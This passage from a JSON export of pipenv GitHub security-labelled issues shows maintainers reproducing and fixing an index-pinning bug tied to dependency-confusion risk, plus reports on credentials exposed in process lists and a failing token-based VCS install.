index=\"server1\"}\r\n\r\n[dev-packages]\r\n\r\n[requires]\r\npython_version = \"3.9\"\r\n\r\n```\r\n\r\n\r\nContents of `Pipfile.lock` ('/home/janne/tmp/pipenvbug/Pipfile.lock'):\r\n\r\n```json\r\n{\r\n    \"_meta\": {\r\n        \"hash\": {\r\n            \"sha256\": \"78e9f526b9a5f7eda8ccc51a8927df178ce4b229e58f42dfa0c4de8ad2b9b07e\"\r\n        },\r\n        \"pipfile-spec\": 6,\r\n        \"requires\": {\r\n            \"python_version\": \"3.9\"\r\n        },\r\n        \"sources\": [\r\n            {\r\n                \"name\": \"server1\",\r\n                \"url\": \"http://127.0.0.1:8081\"\r\n            },\r\n            {\r\n                \"name\": \"server2\",\r\n                \"url\": \"http://127.0.0.1:8082\"\r\n            }\r\n        ]\r\n    },\r\n    \"default\": {\r\n        \"example\": {\r\n            \"hashes\": [\r\n                \"sha256:77b20dfead4f4754da288294f2be8730c70c6835c4e654f0bf4c27905c462cfa\"\r\n            ],\r\n            \"index\": \"server1\",\r\n            \"version\": \"==2\"\r\n        }\r\n    },\r\n    \"develop\": {}\r\n}\r\n\r\n```\r\n</details>\r\n",
                "comments": [
                    {
                        "body": "I can second this behaviour. It's causing a lot of trouble recently, since I didn't know about [\"dependency confusion\"](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) as a risk. Now we published a library to an internal package index that has recently gotten a \"competitor\" at pypi.org.\r\n\r\nPipenv lets me specify the correct index, but doesn't honor it when running `pipenv install`. I'd like to point out that this is a big security risk and this issue should be labeled as such, I believe.",
                        "user": "reinvantveer",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-08-25T07:11:13Z",
                        "url": "https://github.com/pypa/pipenv/issues/4637#issuecomment-905243095"
                    },
                    {
                        "body": "Thanks @janneronkko for saving me the time to describe the bug in full!",
                        "user": "reinvantveer",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-08-25T07:12:27Z",
                        "url": "https://github.com/pypa/pipenv/issues/4637#issuecomment-905243857"
                    },
                    {
                        "body": "@janneronkko I amended the script to replace \r\n```\r\npython -m venv venv\r\nvenv/bin/pip install pypiserver\r\n```\r\nwith simply `pip install pypiserver` and it ran.   However there is issue with the current versions of pip unable to resolve your example:\r\n```\r\nmatteius@matteius-VirtualBox:~/pipenv-triage/pipenv-4637$ ./script.sh \r\n+ trap finish EXIT\r\n+ cat\r\n+ cat\r\n+ EXAMPLE_VERSION=1\r\n+ python setup.py bdist_wheel\r\nrunning bdist_wheel\r\nrunning build\r\nrunning build_py\r\ncopying example.py -> build/lib\r\n/home/matteius/.local/lib/python3.9/site-packages/setuptools/command/install.py:34: SetuptoolsDeprecationWarning: setup.py install is deprecated. Use build and pip and other standards-based tools.\r\n  warnings.warn(\r\ninstalling to build/bdist.linux-x86_64/wheel\r\nrunning install\r\nrunning install_lib\r\ncreating build/bdist.linux-x86_64/wheel\r\ncopying build/lib/example.py -> build/bdist.linux-x86_64/wheel\r\nrunning install_egg_info\r\nrunning egg_info\r\nwriting example.egg-info/PKG-INFO\r\nwriting dependency_links to example.egg-info/dependency_links.txt\r\nwriting entry points to example.egg-info/entry_points.txt\r\nwriting top-level names to example.egg-info/top_level.txt\r\nreading manifest file 'example.egg-info/SOURCES.txt'\r\nwriting manifest file 'example.egg-info/SOURCES.txt'\r\nCopying example.egg-info to build/bdist.linux-x86_64/wheel/example-1-py3.9.egg-info\r\nrunning install_scripts\r\ncreating build/bdist.linux-x86_64/wheel/example-1.dist-info/WHEEL\r\ncreating 'dist/example-1-py3-none-any.whl' and adding 'build/bdist.linux-x86_64/wheel' to it\r\nadding 'example.py'\r\nadding 'example-1.dist-info/METADATA'\r\nadding 'example-1.dist-info/WHEEL'\r\nadding 'example-1.dist-info/entry_points.txt'\r\nadding 'example-1.dist-info/top_level.txt'\r\nadding 'example-1.dist-info/RECORD'\r\nremoving build/bdist.linux-x86_64/wheel\r\n+ EXAMPLE_VERSION=2\r\n+ python setup.py bdist_wheel\r\nrunning bdist_wheel\r\nrunning build\r\nrunning build_py\r\n/home/matteius/.local/lib/python3.9/site-packages/setuptools/command/install.py:34: SetuptoolsDeprecationWarning: setup.py install is deprecated. Use build and pip and other standards-based tools.\r\n  warnings.warn(\r\ninstalling to build/bdist.linux-x86_64/wheel\r\nrunning install\r\nrunning install_lib\r\ncreating build/bdist.linux-x86_64/wheel\r\ncopying build/lib/example.py -> build/bdist.linux-x86_64/wheel\r\nrunning install_egg_info\r\nrunning egg_info\r\nwriting example.egg-info/PKG-INFO\r\nwriting dependency_links to example.egg-info/dependency_links.txt\r\nwriting entry points to example.egg-info/entry_points.txt\r\nwriting top-level names to example.egg-info/top_level.txt\r\nreading manifest file 'example.egg-info/SOURCES.txt'\r\nwriting manifest file 'example.egg-info/SOURCES.txt'\r\nCopying example.egg-info to build/bdist.linux-x86_64/wheel/example-2-py3.9.egg-info\r\nrunning install_scripts\r\ncreating build/bdist.linux-x86_64/wheel/example-2.dist-info/WHEEL\r\ncreating 'dist/example-2-py3-none-any.whl' and adding 'build/bdist.linux-x86_64/wheel' to it\r\nadding 'example.py'\r\nadding 'example-2.dist-info/METADATA'\r\nadding 'example-2.dist-info/WHEEL'\r\nadding 'example-2.dist-info/entry_points.txt'\r\nadding 'example-2.dist-info/top_level.txt'\r\nadding 'example-2.dist-info/RECORD'\r\nremoving build/bdist.linux-x86_64/wheel\r\n+ pip install pypiserver\r\nDefaulting to user installation because normal site-packages is not writeable\r\nCollecting pypiserver\r\n  Downloading pypiserver-1.4.2-py2.py3-none-any.whl (77 kB)\r\n     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 77.6/77.6 KB 1.3 MB/s eta 0:00:00\r\nInstalling collected packages: pypiserver\r\nSuccessfully installed pypiserver-1.4.2\r\n+ mkdir -p server1 server2\r\n+ cp dist/example-1-py3-none-any.whl server1/\r\n+ cp dist/example-2-py3-none-any.whl server2/\r\n+ run_pypi_server 1\r\n+ PYPI_SERVER1_PID=77792\r\n+ venv/bin/pypi-server -p 8081 -i 127.0.0.1 server1/\r\n+ run_pypi_server 2\r\n+ PYPI_SERVER2_PID=77793\r\n+ rm -f Pipfile.lock\r\n+ cat\r\n+ venv/bin/pypi-server -p 8082 -i 127.0.0.1 server2/\r\n++ python -c 'import sys; print(f\"{sys.version_info.major}.{sys.version_info.minor}\")'\r\n+ pipenv lock\r\nCreating a virtualenv for this project...\r\nPipfile: /home/matteius/pipenv-triage/pipenv-4637/Pipfile\r\nUsing /usr/bin/python3.9 (3.9.7) to create virtualenv...\r\n⠏ Creating virtual environment...created virtual environment CPython3.9.7.final.0-64 in 381ms\r\n  creator CPython3Posix(dest=/home/matteius/.virtualenvs/pipenv-4637-JVy8to0_, clear=False, no_vcs_ignore=False, global=False)\r\n  seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/home/matteius/.local/share/virtualenv)\r\n    added seed packages: pip==22.0.3, setuptools==60.9.3, wheel==0.37.1\r\n  activators BashActivator,CShellActivator,FishActivator,NushellActivator,PowerShellActivator,PythonActivator\r\n\r\n✔ Successfully created virtual environment! \r\nVirtualenv location: /home/matteius/.virtualenvs/pipenv-4637-JVy8to0_\r\nLocking [dev-packages] dependencies...\r\nLocking [packages] dependencies...\r\nBuilding requirements...\r\nResolving dependencies...\r\n✘ Locking Failed! \r\n\r\nCRITICAL:pipenv.patched.notpip._internal.resolution.resolvelib.factory:Could not find a version that satisfies the requirement example (from versions: none)\r\n[ResolutionFailure]:   File \"/home/matteius/pipenv/pipenv/resolver.py\", line 743, in _main\r\n[ResolutionFailure]:       resolve_packages(pre, clear, verbose, system, write, requirements_dir, packages, dev)\r\n[ResolutionFailure]:   File \"/home/matteius/pipenv/pipenv/resolver.py\", line 704, in resolve_packages\r\n[ResolutionFailure]:       results, resolver = resolve(\r\n[ResolutionFailure]:   File \"/home/matteius/pipenv/pipenv/resolver.py\", line 685, in resolve\r\n[ResolutionFailure]:       return resolve_deps(\r\n[ResolutionFailure]:   File \"/home/matteius/pipenv/pipenv/utils.py\", line 1377, in resolve_deps\r\n[ResolutionFailure]:       results, hashes, markers_lookup, resolver, skipped = actually_resolve_deps(\r\n[ResolutionFailure]:   File \"/home/matteius/pipenv/pipenv/utils.py\", line 1106, in actually_resolve_deps\r\n[ResolutionFailure]:       resolver.resolve()\r\n[ResolutionFailure]:   File \"/home/matteius/pipenv/pipenv/utils.py\", line 884, in resolve\r\n[ResolutionFailure]:       raise ResolutionFailure(message=str(e))\r\n[pipenv.exceptions.ResolutionFailure]: Warning: Your dependencies could not be resolved. You likely have a mismatch in your sub-dependencies.\r\n  You can use $ pipenv install --skip-lock to bypass this mechanism, then run $ pipenv graph to inspect the situation.\r\n  Hint: try $ pipenv lock --pre if it is a pre-release dependency.\r\nERROR: No matching distribution found for example\r\n\r\n+ finish\r\n+ set +e\r\n+ kill -9 77792\r\n./script.sh: line 9: kill: (77792) - No such process\r\n+ true\r\n+ kill -9 77793\r\n./script.sh: line 10: kill: (77793) - No such process\r\n+ true\r\n```",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-03-13T05:14:10Z",
                        "url": "https://github.com/pypa/pipenv/issues/4637#issuecomment-1066028357"
                    },
                    {
                        "body": "Ah-ha I got it to run.   because I changed the path to not use venv I had to also remove that from the `pypi-server` command.  Ok so it ran and generated a Pipfile.lock and the actual package installed is in fact 2 using `pipenv==2022.1.8`\r\n```\r\nmatteius@matteius-VirtualBox:~/pipenv-triage/pipenv-4637$ pipenv run pip freeze\r\nexample==2\r\n```\r\n\r\nAlso checked it on my pip 22.0.4 branch and that also has the issue.",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-03-13T05:30:43Z",
                        "url": "https://github.com/pypa/pipenv/issues/4637#issuecomment-1066030129"
                    },
                    {
                        "body": "Actually I am wondering if this will even be  possible to exclude pypi from the search indexes within pip.\r\nhttps://stackoverflow.com/a/67442488",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-03-13T11:16:24Z",
                        "url": "https://github.com/pypa/pipenv/issues/4637#issuecomment-1066079325"
                    },
                    {
                        "body": "@frostming If you have time to have your attention drawn to this issue, I think it is critically important based on the reproduction.  There are a couple issues at play here, but the primary one of this ticket is that the resolver is not respecting the index specifications for a particular requirement. ",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-03-13T14:18:34Z",
                        "url": "https://github.com/pypa/pipenv/issues/4637#issuecomment-1066112056"
                    },
                    {
                        "body": "I messed around with this most of the day without much success, like there was some forward progress but ultimately broke a bunch of tests so not really progress.   I did learn these three things:\r\n1.) There is a bug where if the package name exists in pypi then it will takes precedence in the resolver.  Since this test was for two private pypis, having the package named example was creating this confusion and causing more headaches so I renamed it to something unique to try and sort out issues 2 & 3.\r\n2.) There is the issue of the Resolver not respecting the specified index so it can in this example it picks version 2 when only version 1 is available in the specified package index.\r\n3.) There is the issue of the Pipenv install not respecting the specified index in the Package.lock when it goes to install that version.",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-03-14T04:32:32Z",
                        "url": "https://github.com/pypa/pipenv/issues/4637#issuecomment-1066330893"
                    },
                    {
                        "body": "This is going to be fairly hard to solve I think.   For 2.) the resolver not respecting the indexes ... we create one pip package finder and one pip resolver to resolve all requirements.  Pipenv's Resolver knows about the `index_lookup` mapping of which packages are restricted to a particular index, but there is no real way to pass this into Pip's resolver.  It uses the `finder._link_collector.search_scope.index_urls` which it includes all of them and kind of has to because it is used to resolved all constraints not just the one with the index restriction.   So then Pip doesn't seem to support the same notion of an index_lookup ... not sure how to proceed with a fix at this time.",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-03-14T05:54:59Z",
                        "url": "https://github.com/pypa/pipenv/issues/4637#issuecomment-1066407589"
                    },
                    {
                        "body": "That being said, I have an experimental branch that changed vendor'd code including pip code to try and solve for this problem.   In my branch `issue-4637`  I have your test example passing.  I am running the test suite now locally to see how bad it messes up anything else, but it _is bad_ because it requires changes to pip internals and I can't see the light at the end of the tunnel for what that entails.",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-03-14T07:39:52Z",
                        "url": "https://github.com/pypa/pipenv/issues/4637#issuecomment-1066468776"
                    },
                    {
                        "body": "Ok I opened a PR, 1 test is failing when run in the group but when I run it singularly it passes every time (but also fails locally if I run the whole group).  Will have to investigate that, and what can be done to support what I am trying to do within pip, since I modified the pip internals for part of it:  https://github.com/pypa/pipenv/pull/4983\r\n\r\nHowever, it does seem to fix your issue at least in terms of your example test. ",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-03-14T14:37:39Z",
                        "url": "https://github.com/pypa/pipenv/issues/4637#issuecomment-1066880795"
                    },
                    {
                        "body": "@matteius Thanks for taking the time to do this, I do believe this could fix a serious security issue! ",
                        "user": "reinvantveer",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-03-14T14:46:18Z",
                        "url": "https://github.com/pypa/pipenv/issues/4637#issuecomment-1066890456"
                    },
                    {
                        "body": "@janneronkko or @reinvantveer this is mostly set, but I've run into some snags adding a unit test to the project for it.  May be able to move forward with out that, but its not ideal.   @janneronkko example involves running two pypi test servers and generating a test package on the fly.  We have a test fixture for a single pypi test server but I think its port is dynamic and some other differences making the script hard to port.  I had started something for it but lost those changes in my stash when I had to destroy my local copy and reclone, but its ok because I hadn't gotten very far.  If either of you have time to consider the testing angle that could really help prevent future regressions.",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-03-19T11:39:00Z",
                        "url": "https://github.com/pypa/pipenv/issues/4637#issuecomment-1072994164"
                    },
                    {
                        "body": "I merged the fix in master -- feel free to respond if you have ideas on getting a test in place.   Wanted to ensure that the fix gets in the next release however.  ",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-03-22T03:58:56Z",
                        "url": "https://github.com/pypa/pipenv/issues/4637#issuecomment-1074699179"
                    },
                    {
                        "body": "`2022.3.23` has been released!",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-03-23T02:40:14Z",
                        "url": "https://github.com/pypa/pipenv/issues/4637#issuecomment-1075856101"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pypa/pipenv/issues/4627",
                "title": "Disclosure credentials for private PyPi repo in the list of processes",
                "labels": [
                    "Type: Enhancement :bulb:",
                    "Category: Private PyPIs :sunglasses:",
                    "Category: Security"
                ],
                "user": "zaufi",
                "issue_author_association": "NONE",
                "number": 4627,
                "id": 812381666,
                "state": "closed",
                "project_created_at": "2021-02-19T21:58:13Z",
                "closed_at": "2023-08-26T05:26:48Z",
                "body": "In my project, I use [Injecting credentials into Pipfiles via environment variables](https://pipenv-fork.readthedocs.io/en/latest/advanced.html#injecting-credentials-into-pipfiles-via-environment-variables) as described in the documentation.\r\n\r\nHowever, when `pipenv` performs install, it runs `pip` w/ `--extra-index-url https://<my-secret-credentials>@my.pypi.repo` option which is pretty visible in the list of processes to anyone on the host.\r\n\r\nIt'll be nice to keep secrets better ;-)",
                "comments": [
                    {
                        "body": "@zaufi Which version of pipenv?  Have you tried with `2022.1.8`?",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-03-13T10:06:21Z",
                        "url": "https://github.com/pypa/pipenv/issues/4627#issuecomment-1066066579"
                    },
                    {
                        "body": "> @zaufi Which version of pipenv? Have you tried with `2022.1.8`?\r\n\r\n```\r\n$ pipenv --version\r\npipenv, version 2022.5.2\r\n```",
                        "user": "zaufi",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-07-06T05:33:23Z",
                        "url": "https://github.com/pypa/pipenv/issues/4627#issuecomment-1175799653"
                    },
                    {
                        "body": "Thanks @zaufi -- I was closing out old issues and I can now see that this issue is specifically about the list of processes showing the expanded variables to the pip subprocess:\r\n> --extra-index-url https://<my-secret-credentials>@my.pypi.repo option which is pretty visible in the list of processes to anyone on the host.\r\n\r\nI have re-opened the issue as this deserves more attention at some point.",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-07-06T05:58:48Z",
                        "url": "https://github.com/pypa/pipenv/issues/4627#issuecomment-1175813358"
                    },
                    {
                        "body": "@zaufi So I just did some testing and can confirm what you are seeing with `top -c` however I find that even pip itself expands the environment variables into the CLI args, however if I modify the command to pass in like this:\r\n`pip install requests <<< \"--extra-index-url https://${SECRET}@my.pypi.repo\"` it does hide the variable from `top -c`.\r\n\r\nHowever this syntax does not work for Powershell, I believe it is bash specific.",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-07-06T06:36:55Z",
                        "url": "https://github.com/pypa/pipenv/issues/4627#issuecomment-1175837107"
                    },
                    {
                        "body": "One solution I see is to use `.netrc` file somehow, which is already supported by `pip`.",
                        "user": "zaufi",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-07-06T07:30:24Z",
                        "url": "https://github.com/pypa/pipenv/issues/4627#issuecomment-1175879455"
                    },
                    {
                        "body": "We removed support for `--extra-index-url` so it should never be in the process list now.",
                        "user": "matteius",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-08-26T05:26:48Z",
                        "url": "https://github.com/pypa/pipenv/issues/4627#issuecomment-1694171767"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pypa/pipenv/pull/4254",
                "title": "Potential Security Issue",
                "labels": [
                    "Category: Security"
                ],
                "user": "titan550",
                "issue_author_association": "NONE",
                "number": 4254,
                "id": 618689553,
                "state": "closed",
                "project_created_at": "2020-05-15T04:30:41Z",
                "closed_at": "2020-05-19T22:04:22Z",
                "body": "I intend to contact you for a possible security vulnerability. I first wanted to open a ticket but then I thought that I should first try to directly reach out to you. Please describe your security policy in the repo.",
                "comments": [
                    {
                        "body": "You can reach out to @uranusjr @frostming and myself via email for now if you like, and we can determine how to proceed from there. We will likely try to get  a fix out if necessary before the next release.\r\n\r\nThanks for reaching out",
                        "user": "techalchemy",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-05-17T05:18:58Z",
                        "url": "https://github.com/pypa/pipenv/pull/4254#issuecomment-629745087"
                    },
                    {
                        "body": "I believe this has been addressed offline, and ultimately is not a major issue.\r\n\r\nWhat is an issue is our lack of documented security policy, so we'd be happy to address that one for sure. Thanks for raising your concerns and reporting responsibly! ",
                        "user": "techalchemy",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2020-05-19T22:04:22Z",
                        "url": "https://github.com/pypa/pipenv/pull/4254#issuecomment-631108269"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pypa/pipenv/pulls/4254",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/pypa/pipenv/issues/4253",
                "title": "Error importing requirements.txt file containing VCS URL with environment variable",
                "labels": [
                    "Category: Dependency Resolution",
                    "Category: VCS",
                    "Status: Awaiting Update :hourglass_flowing_sand:",
                    "Category: Security"
                ],
                "user": "skyoo2003",
                "issue_author_association": "NONE",
                "number": 4253,
                "id": 617959022,
                "state": "closed",
                "project_created_at": "2020-05-14T06:24:56Z",
                "closed_at": "2022-11-05T07:23:15Z",
                "body": "### Issue description\r\n\r\nI just tried to import the following the file, but failed.\r\n\r\n* requirements.txt\r\n```\r\n-e git+https://${GITHUB_TOKEN}@github.com/skyoo2003/myprivate.git@v1.0.0#egg=myprivate\r\n```\r\n\r\n### Expected result\r\n\r\nExpect the dependency to be included in \"Pipfile\" and successful installation\r\n\r\n### Actual result\r\n\r\nI typed the enter key twice because it didn't seem to stop, and it failed with the error message below.\r\n\r\n```sh\r\n$ pipenv install -r requirements.txt --verbose\r\nRequirements file provided! Importing into Pipfile…\r\nPipfile.lock not found, creating…\r\nLocking [dev-packages] dependencies…\r\nLocking [packages] dependencies…\r\nBuilding requirements...\r\nResolving dependencies...\r\n⠹ Locking...\r\n⠴ Locking...\r\n⠏ Locking...ERROR:pip.subprocessor:Command errored out with exit status 128:\r\n command: git clone -q 'https://****@github.com/skyoo2003/myprivate.git' /tmp/pipenv-zlxgv8gf-src/myprivate\r\n     cwd: None\r\nComplete output (2 lines):\r\nremote: Invalid username or password.\r\nfatal: Authentication failed for 'https://****@github.com/skyoo2003/myprivate.git/'\r\n----------------------------------------\r\n✘ Locking Failed! \r\nTraceback (most recent call last):\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 807, in <module>\r\n    main()\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 803, in main\r\n    parsed.requirements_dir, parsed.packages, parse_only=parsed.parse_only)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 785, in _main\r\n    resolve_packages(pre, clear, verbose, system, write, requirements_dir, packages)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 753, in resolve_packages\r\n    requirements_dir=requirements_dir,\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 736, in resolve\r\n    req_dir=requirements_dir\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 1379, in resolve_deps\r\n    req_dir=req_dir,\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 1084, in actually_resolve_deps\r\n    deps, index_lookup, markers_lookup, project, sources, req_dir, clear, pre\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 649, in create\r\n    pre=pre, clear=clear\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 463, in get_metadata\r\n    req, resolver=transient_resolver\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 540, in get_deps_from_req\r\n    req_list, lockfile = get_vcs_deps(reqs=[req])\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 1867, in get_vcs_deps\r\n    with temp_path(), locked_repository(requirement) as repo:\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/contextlib.py\", line 81, in __enter__\r\n    return next(self.gen)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 2029, in locked_repository\r\n    with requirement.req.locked_vcs_repo(src_dir=src_dir) as repo:\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/contextlib.py\", line 81, in __enter__\r\n    return next(self.gen)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/vendor/requirementslib/models/requirements.py\", line 2141, in locked_vcs_repo\r\n    vcsrepo = self.get_vcs_repo(src_dir=src_dir)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/vendor/requirementslib/models/requirements.py\", line 2097, in get_vcs_repo\r\n    vcsrepo.obtain()\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/vendor/requirementslib/models/vcs.py\", line 77, in obtain\r\n    self.repo_backend.obtain(self.checkout_directory, self.parsed_url)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/patched/notpip/_internal/vcs/versioncontrol.py\", line 527, in obtain\r\n    self.fetch_new(dest, url, rev_options)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/patched/notpip/_internal/vcs/git.py\", line 225, in fetch_new\r\n    self.run_command(make_command('clone', '-q', url, dest))\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/patched/notpip/_internal/vcs/versioncontrol.py\", line 667, in run_command\r\n    log_failed_cmd=log_failed_cmd)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/patched/notpip/_internal/utils/subprocess.py\", line 242, in call_subprocess\r\n    raise InstallationError(exc_msg)\r\npipenv.patched.notpip._internal.exceptions.InstallationError: Command errored out with exit status 128: git clone -q 'https://****@github.com/skyoo2003/myprivate.git' /tmp/pipenv-zlxgv8gf-src/myprivate Check the logs for full command output.\r\nERROR:pip.subprocessor:Command errored out with exit status 128:\r\n command: git clone -q 'https://****@github.com/skyoo2003/myprivate.git' /tmp/pipenv-zlxgv8gf-src/myprivate\r\n     cwd: None\r\nComplete output (2 lines):\r\nremote: Invalid username or password.\r\nfatal: Authentication failed for 'https://****@github.com/skyoo2003/myprivate.git/'\r\n----------------------------------------\r\nTraceback (most recent call last):\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 807, in <module>\r\n    main()\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 803, in main\r\n    parsed.requirements_dir, parsed.packages, parse_only=parsed.parse_only)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 785, in _main\r\n    resolve_packages(pre, clear, verbose, system, write, requirements_dir, packages)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 753, in resolve_packages\r\n    requirements_dir=requirements_dir,\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/resolver.py\", line 736, in resolve\r\n    req_dir=requirements_dir\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 1379, in resolve_deps\r\n    req_dir=req_dir,\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 1084, in actually_resolve_deps\r\n    deps, index_lookup, markers_lookup, project, sources, req_dir, clear, pre\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 649, in create\r\n    pre=pre, clear=clear\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 463, in get_metadata\r\n    req, resolver=transient_resolver\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 540, in get_deps_from_req\r\n    req_list, lockfile = get_vcs_deps(reqs=[req])\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 1867, in get_vcs_deps\r\n    with temp_path(), locked_repository(requirement) as repo:\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/contextlib.py\", line 81, in __enter__\r\n    return next(self.gen)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/utils.py\", line 2029, in locked_repository\r\n    with requirement.req.locked_vcs_repo(src_dir=src_dir) as repo:\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/contextlib.py\", line 81, in __enter__\r\n    return next(self.gen)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/vendor/requirementslib/models/requirements.py\", line 2141, in locked_vcs_repo\r\n    vcsrepo = self.get_vcs_repo(src_dir=src_dir)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/vendor/requirementslib/models/requirements.py\", line 2097, in get_vcs_repo\r\n    vcsrepo.obtain()\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/vendor/requirementslib/models/vcs.py\", line 77, in obtain\r\n    self.repo_backend.obtain(self.checkout_directory, self.parsed_url)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/patched/notpip/_internal/vcs/versioncontrol.py\", line 527, in obtain\r\n    self.fetch_new(dest, url, rev_options)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/patched/notpip/_internal/vcs/git.py\", line 225, in fetch_new\r\n    self.run_command(make_command('clone', '-q', url, dest))\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/patched/notpip/_internal/vcs/versioncontrol.py\", line 667, in run_command\r\n    log_failed_cmd=log_failed_cmd)\r\n  File \"/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv/patched/notpip/_internal/utils/subprocess.py\", line 242, in call_subprocess\r\n    raise InstallationError(exc_msg)\r\npipenv.patched.notpip._internal.exceptions.InstallationError: Command errored out with exit status 128: git clone -q 'https://****@github.com/skyoo2003/myprivate.git' /tmp/pipenv-zlxgv8gf-src/myprivate Check the logs for full command output.\r\n```\r\n\r\n### Steps to replicate\r\n\r\nProvide the steps to replicate (which usually at least includes the commands and the Pipfile).\r\n\r\n1. Prepare a requirements.txt file containing VCS URL with environment variable and initialized Pipfile\r\n2. Execute a command such as `pipenv install -r requirements.txt --verbose`\r\n\r\n<details><summary>$ pipenv --support</summary>\r\n\r\nPipenv version: `'2020.4.1b1'`\r\n\r\nPipenv location: `'/home/lukas/.pyenv/versions/3.6.10/lib/python3.6/site-packages/pipenv'`\r\n\r\nPython location: `'/home/lukas/.pyenv/versions/3.6.10/bin/python3.6'`\r\n\r\nPython installations found:\r\n\r\n  - `3.6.10`: `/home/lukas/.pyenv/versions/3.6.10/bin/python3.6`\r\n  - 